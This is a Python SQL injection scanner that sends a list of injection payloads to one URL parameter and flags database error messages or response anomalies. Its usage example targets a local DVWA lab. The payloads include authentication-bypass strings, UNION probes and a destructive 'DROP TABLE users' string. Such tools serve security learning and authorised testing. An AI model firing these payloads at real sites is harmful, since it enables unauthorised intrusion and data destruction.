#!/usr/bin/env python3
"""
SQLi Tester v1
Automated SQL Injection vulnerability scanner
Author: [Your Name]
Date: September 21, 2024
"""

import requests
import sys
import time

GREEN = "\033[92m"
RED = "\033[91m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
RESET = "\033[0m"
BOLD = "\033[1m"

PAYLOADS = [
    "'",
    "\"",
    "' OR '1'='1",
    "' OR '1'='1' --",
    "' OR '1'='1' #",
    "' UNION SELECT NULL--",
    "' UNION SELECT NULL,NULL--",
    "' UNION SELECT NULL,NULL,NULL--",
    "1' ORDER BY 1--",
    "1' ORDER BY 10--",
    "1' AND 1=1--",
    "1' AND 1=2--",
    "admin'--",
    "' OR 1=1--",
    "1; DROP TABLE users--",
]

SQL_ERRORS = [
    "sql syntax",
    "mysql",
    "oracle",
    "postgresql",
    "sqlite",
    "microsoft sql",
    "unclosed quotation",
    "quoted string",
    "syntax error",
    "sql error",
    "database error",
    "odbc",
    "jdbc",
    "sqlexception",
    "warning: mysql",
    "pg_query",
    "sqlite3.OperationalError",
]


def banner():
    print(f"{CYAN}{BOLD}")
    print("  ╔══════════════════════════════════════╗")
    print("  ║       🔍 SQLi Tester v1             ║")
    print("  ║   Automated SQL Injection Scanner   ║")
    print("  ╚══════════════════════════════════════╝")
    print(f"{RESET}")


def test_sqli(url, param):
    """Test a URL parameter for SQL injection vulnerabilities."""
    print(f"{YELLOW}[*] Testing: {url}?{param}=PAYLOAD{RESET}")
    print(f"{YELLOW}[*] Payloads: {len(PAYLOADS)}{RESET}\n")

    vulnerable = False
    results = []

    try:
        baseline = requests.get(f"{url}?{param}=test", timeout=10)
        baseline_length = len(baseline.text)
        baseline_status = baseline.status_code
        print(f"{CYAN}[*] Baseline: Status {baseline_status}, Size {baseline_length}{RESET}\n")
    except requests.exceptions.RequestException as e:
        print(f"{RED}[!] Connection error: {e}{RESET}")
        return

    for i, payload in enumerate(PAYLOADS, 1):
        try:
            target_url = f"{url}?{param}={payload}"
            response = requests.get(target_url, timeout=10)
            response_text = response.text.lower()
            response_length = len(response.text)

            error_found = None
            for error in SQL_ERRORS:
                if error in response_text:
                    error_found = error
                    break

            length_diff = abs(response_length - baseline_length)
            length_anomaly = length_diff > 100  # More than 100 bytes difference

            status_changed = response.status_code != baseline_status

            is_vuln = error_found or (length_anomaly and status_changed)

            if is_vuln:
                vulnerable = True
                status = f"{RED}VULNERABLE{RESET}"
            else:
                status = f"{GREEN}Safe{RESET}"

            print(f"  [{i:2d}/{len(PAYLOADS)}] {status} | "
                  f"Status: {response.status_code} | "
                  f"Size: {response_length:6d} | "
                  f"Payload: {payload}")

            if error_found:
                print(f"         {RED}↳ SQL Error detected: '{error_found}'{RESET}")

            results.append({
                "payload": payload,
                "status": response.status_code,
                "size": response_length,
                "vulnerable": is_vuln,
                "error": error_found
            })

            # Be polite — don't hammer the server
            time.sleep(0.5)

        except requests.exceptions.RequestException as e:
            print(f"  [{i:2d}/{len(PAYLOADS)}] {RED}ERROR{RESET} | {e}")

    print(f"\n{CYAN}{'='*50}{RESET}")
    vuln_count = sum(1 for r in results if r["vulnerable"])
    if vulnerable:
        print(f"{RED}{BOLD}[!] VULNERABLE! {vuln_count}/{len(PAYLOADS)} payloads triggered anomalies.{RESET}")
        print(f"{RED}[!] Manual verification recommended with Burp Suite.{RESET}")
    else:
        print(f"{GREEN}[✔] No SQL injection detected with tested payloads.{RESET}")
        print(f"{YELLOW}[*] This doesn't guarantee safety — also try blind SQLi techniques.{RESET}")
    print(f"{CYAN}{'='*50}{RESET}")


def main():
    banner()

    if len(sys.argv) < 3:
        print(f"{YELLOW}Usage: python3 sqli_tester.py <URL> <PARAMETER>{RESET}")
        print(f"{YELLOW}Example: python3 sqli_tester.py http://localhost:8080/vulnerabilities/sqli id{RESET}")
        print(f"\n{CYAN}Note: Set DVWA security to 'Low' and include your session cookie in the URL if needed.{RESET}")
        sys.exit(1)

    url = sys.argv[1]
    param = sys.argv[2]

    test_sqli(url, param)


if __name__ == "__main__":
    main()
